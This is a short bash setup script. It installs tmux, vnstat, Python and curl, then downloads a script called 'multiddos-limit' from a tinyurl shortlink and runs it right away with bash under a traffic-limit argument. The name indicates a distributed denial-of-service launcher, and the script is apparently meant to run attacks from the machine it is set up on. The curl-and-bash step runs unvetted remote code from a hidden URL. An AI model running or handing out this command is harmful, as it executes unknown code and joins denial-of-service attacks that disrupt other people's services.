#!/bin/bash
sudo apt update -y
sudo apt install -y tmux vnstat python3 python3-pip curl

curl -LO tinyurl.com/multiddos-limit && bash multiddos-limit +l 966367641600  && tmux a
